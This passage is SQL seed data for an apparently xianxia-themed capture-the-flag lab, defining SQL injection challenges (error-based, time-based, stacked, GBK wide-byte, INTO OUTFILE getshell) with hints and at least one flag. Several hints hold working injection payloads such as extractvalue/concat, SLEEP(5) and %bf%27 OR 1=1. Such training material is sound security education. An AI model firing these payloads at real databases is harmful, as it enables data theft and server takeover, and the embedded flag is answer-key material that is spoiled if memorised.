...
('LH-JZ-06', '【轮回宗·筑基】幽冥报错', 'lunhuizong', 'zhuji', 2, 'sqli_error',
 ...
 '报错注入 extractvalue/updatexml（MySQL 专属，SQLite 无等价函数）。Payload: 1'' AND extractvalue(1,concat(0x7e,version()))-- -',
...
('WM-JZ-08', '【万魔宗·筑基】时光咒', 'wanmozong', 'zhuji', 2, 'sqli_time',
 ...
 '时间盲注。Payload: 1'' AND SLEEP(5)-- -（SQLite 无 SLEEP()，用重型递归 CTE 制造延迟）',
...
('LH-JD-04', '【轮回宗·金丹】轮回双咒', 'lunhuizong', 'jindan', 3, 'sqli_stacked',
 '轮回宗允许同时执行多个咒语。',
 '堆叠注入。Payload: 1''; SELECT * FROM demo_users-- -',
 'flag{sqli_stacked_query_29}', 25, 29, 1, 1),
('LH-JD-05', '【轮回宗·金丹】宽字节迷阵', 'lunhuizong', 'jindan', 3, 'sqli_gbk',
 '轮回宗使用 GBK 编码，引号会被吞掉。',
 '宽字节注入（MySQL 专属，SQLite 恒为 UTF-8 且 addslashes 不防注入）。Payload (MySQL): 1%bf%27 OR 1=1-- -；Payload (SQLite): 1'' OR 1=1-- -',
...
('WM-LX-03', '【万魔宗·炼虚】SQL通幽', 'wanmozong', 'lianxu', 5, 'sqli_getshell',
 ...
 'SQL 注入 INTO OUTFILE/GetShell（MySQL 专属，需 FILE 权限；SQLite 无等价手法）。',
